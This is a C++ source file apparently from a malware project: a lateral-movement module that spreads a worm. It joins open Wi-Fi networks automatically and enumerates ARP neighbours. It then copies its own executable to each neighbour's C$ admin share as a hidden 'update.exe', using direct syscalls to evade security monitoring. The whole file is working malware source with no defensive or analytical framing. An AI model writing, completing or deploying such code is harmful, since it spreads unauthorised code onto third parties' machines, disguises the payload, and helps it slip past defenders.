#include "WirelessSpread.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/ApiHasher.h"
#include <windows.h>
#include <wlanapi.h>
#include <vector>
#include <string>
#include <iphlpapi.h>

#ifndef WLAN_PROFILE_GET_PLAINTEXT_KEY
#define WLAN_PROFILE_GET_PLAINTEXT_KEY 4
#endif

namespace lateral {

bool TryDropPayload(const std::string& targetIp) {
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    std::wstring remotePath = L"\\\\" + utils::s2ws(targetIp) + L"\\C$\\Users\\Public\\Documents\\update.exe";
    HANDLE hFile = CreateFileW(remotePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    HANDLE hLocal = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hLocal == INVALID_HANDLE_VALUE) { CloseHandle(hFile); return false; }
    std::vector<uint8_t> data(GetFileSize(hLocal, NULL));
    DWORD read;
    ReadFile(hLocal, data.data(), (DWORD)data.size(), &read, NULL);
    CloseHandle(hLocal);
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
    PVOID gadget = resolver.GetSyscallGadget();
    if (ntWriteFileSsn == 0xFFFFFFFF || !gadget) { CloseHandle(hFile); return false; }

    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status = InternalDoSyscall(ntWriteFileSsn, gadget, (UINT_PTR)hFile, 0, 0, 0, (UINT_PTR)&ioStatus, (UINT_PTR)data.data(), (UINT_PTR)data.size(), 0, 0, 0, 0);
    InternalDoSyscall(ntCloseSsn, gadget, (UINT_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    return NT_SUCCESS(status);
}

std::string SpreadWireless(const std::string& mode) {
    LOG_INFO("Wireless spreading started. Mode: " + mode);
    if (mode == "wifi") {
        HANDLE hClient = NULL;
        DWORD dwCurVersion = 0;
        if (WlanOpenHandle(2, NULL, &dwCurVersion, &hClient) == ERROR_SUCCESS) {
            PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
            if (WlanEnumInterfaces(hClient, NULL, &pIfList) == ERROR_SUCCESS) {
                for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
                    WLAN_INTERFACE_INFO IfInfo = pIfList->InterfaceInfo[i];
                    PWLAN_AVAILABLE_NETWORK_LIST pNetList = NULL;
                    if (WlanGetAvailableNetworkList(hClient, &IfInfo.InterfaceGuid, 0, NULL, &pNetList) == ERROR_SUCCESS) {
                        for (DWORD j = 0; j < pNetList->dwNumberOfItems; j++) {
                            WLAN_AVAILABLE_NETWORK network = pNetList->Network[j];
                            if (network.bNetworkConnectable && network.dot11DefaultCipherAlgorithm == DOT11_CIPHER_ALGO_NONE) {
                                LOG_INFO("Found open WiFi: " + std::string((char*)network.dot11Ssid.ucSSID, network.dot11Ssid.uSSIDLength));
                                WLAN_CONNECTION_PARAMETERS params;
                                params.wlanConnectionMode = wlan_connection_mode_temporary_profile;
                                params.strProfile = NULL;
                                params.pDot11Ssid = &network.dot11Ssid;
                                params.pDesiredBssidList = NULL;
                                params.dot11BssType = dot11_BSS_type_any;
                                params.dwFlags = 0;
                                WlanConnect(hClient, &IfInfo.InterfaceGuid, &params, NULL);
                            }
                        }
                        WlanFreeMemory(pNetList);
                    }
                }
                WlanFreeMemory(pIfList);
            }
            WlanCloseHandle(hClient, NULL);
        }
    }

    PMIB_IPNETTABLE pIpNetTable = NULL;
    ULONG dwSize = 0;
    if (GetIpNetTable(NULL, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
        pIpNetTable = (PMIB_IPNETTABLE)malloc(dwSize);
        if (GetIpNetTable(pIpNetTable, &dwSize, FALSE) == ERROR_SUCCESS) {
            for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
                if (pIpNetTable->table[i].dwType == MIB_IPNET_TYPE_DYNAMIC) {
                    IN_ADDR addr;
                    addr.S_un.S_addr = pIpNetTable->table[i].dwAddr;
                    std::string targetIp = inet_ntoa(addr);
                    LOG_INFO("Discovered target via ARP: " + targetIp);
                    TryDropPayload(targetIp);
                }
            }
        }
        free(pIpNetTable);
    }
    return "Finished wireless spread";
}

} // namespace lateral
